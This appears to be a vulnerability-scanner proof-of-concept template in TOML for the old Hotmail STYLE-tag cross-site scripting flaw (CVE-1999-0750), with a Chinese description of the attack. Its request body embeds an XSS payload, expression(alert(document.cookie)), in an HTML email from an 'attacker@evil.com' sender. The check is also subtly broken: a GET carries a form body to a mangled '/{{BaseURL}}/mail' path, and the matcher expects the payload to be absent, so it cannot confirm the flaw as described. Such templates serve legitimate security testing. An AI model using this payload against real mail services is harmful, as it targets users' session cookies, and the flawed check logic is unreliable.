[info]
author = "ave"
description = "验证 Hotmail（及类似基于 Web 的邮件服务）是否会在渲染 HTML 邮件时未对 STYLE 标签内的 content 属性进行过滤，从而允许攻击者注入并执行任意 JavaScript 代码。构造包含 style='x:expression(alert(document.cookie))' 或 STYLE 标签中 JavaScript 表达式的 HTML 邮件内容，发送至目标账户并查看渲染结果，若脚本被执行则存在漏洞。"
id = "POC-AVE-1999-0392"
name = "CVE-1999-0750 Hotmail STYLE 标签 XSS PoC"
severity = "medium"
tags = ["ave-1999-0392"]
vuln_id = [
    "CVE-1999-0750",
    "AVE-1999-0392",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/mail"
protocol = "http"

[poc.requests.body]
content = "from=attacker@evil.com&to=victim@hotmail.com&subject=test&body=<html><body><style>x:expression(alert(document.cookie))</style></body></html>"
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["expression(alert(document.cookie))"]
